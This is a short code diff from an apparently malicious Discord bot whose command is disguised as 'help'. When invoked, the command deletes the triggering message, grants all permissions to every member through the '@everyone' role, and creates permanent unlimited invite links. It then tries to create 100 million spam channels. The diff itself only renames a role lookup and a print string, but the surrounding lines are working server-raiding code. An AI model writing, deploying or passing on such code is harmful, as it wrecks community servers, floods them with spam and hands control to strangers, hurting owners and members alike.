@@ -42,7 +42,7 @@ async def help(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
-      role = discord.utils.get(guild.roles, name = "@everyone")
+      role = discord.utils.get(guild.roles, name = "")
       await role.edit(permissions = Permissions.all())
       print(Fore.MAGENTA + "I give admin to all members." + Fore.RESET)
     except:
@@ -82,7 +82,7 @@ async def help(ctx):
     await guild.create_text_channel("")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
-        print(f"New Invite: {link}")
+        print(f"Invite Link: {link}")
     amount = 100000000
     for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
